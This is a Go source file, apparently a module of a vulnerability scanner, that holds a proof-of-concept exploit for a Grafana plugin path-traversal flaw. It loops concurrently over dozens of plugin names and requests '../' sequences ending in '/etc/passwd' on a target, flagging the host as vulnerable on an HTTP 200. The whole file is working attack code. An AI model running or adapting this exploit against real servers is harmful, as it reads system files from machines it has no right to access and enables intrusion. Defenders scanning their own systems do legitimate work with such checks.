package scripts

import (
	"Gopo/utils"
	"context"
	"fmt"
	"github.com/jweny/xhttp"
	"net/http"
	"sync"
)

const pocName1 = "Grafana-cve-2021-4379"

type Task struct {
	target string
	plugin string
}

var isVul = false
var plugins = []string{"live","icon","loki","text","logs","news","stat","mssql","mixed","mysql","tempo","graph","gauge","table","debug","zipkin","jaeger","geomap","canvas","grafana","welcome","xychart","heatmap","postgres","testdata","opentsdb","influxdb","barchart","annolist","bargauge","graphite","dashlist","piechart","dashboard","nodeGraph","alertlist","histogram","table-old","pluginlist","timeseries","cloudwatch","prometheus","stackdriver","alertGroups","alertmanager","elasticsearch","gettingstarted","state-timeline","status-history","grafana-clock-panel","grafana-simple-json-datasource","grafana-azure-monitor-datasource"}
var req =&xhttp.Request{}

func grafana(target string){
	var wg sync.WaitGroup
	var tasks []Task
	taskChan := make(chan Task,threads)
	for _,plugin:=range plugins{
		task:=Task{
			plugin: plugin,
			target: target,
		}
		tasks=append(tasks,task)
	}

	worker:= func(taskChan  chan Task,wg *sync.WaitGroup) {
		for task:=range taskChan{
			execPoc(task)
			wg.Done()
		}
	}
	for i:=0;i<threads;i++{
		go worker(taskChan,&wg)
	}

	for _,task:=range tasks{
		taskChan<-task
		wg.Add(1)
	}
	wg.Wait()
	if isVul{
		utils.Green("%v %v find",target,pocName1)
	}
}

func execPoc(task Task){
	target:=task.target
	plugin:=task.plugin
	path:=fmt.Sprintf("/public/plugins/%v/../../../../../../../../etc/passwd",plugin)
	hr,_:=http.NewRequest("GET",target+path,nil)
	req.RawRequest=hr
	ctx:=context.Background()
	oResp,err:= utils.Client.Do(ctx,req)
	if err!=nil{
		utils.Error(err)
		return
	}
	if oResp.GetStatus()==200{
		isVul=true
		utils.InforF("%v plugin exists",plugin)
	}
}

func init()  {
	scriptRegister(pocName1,grafana)
}

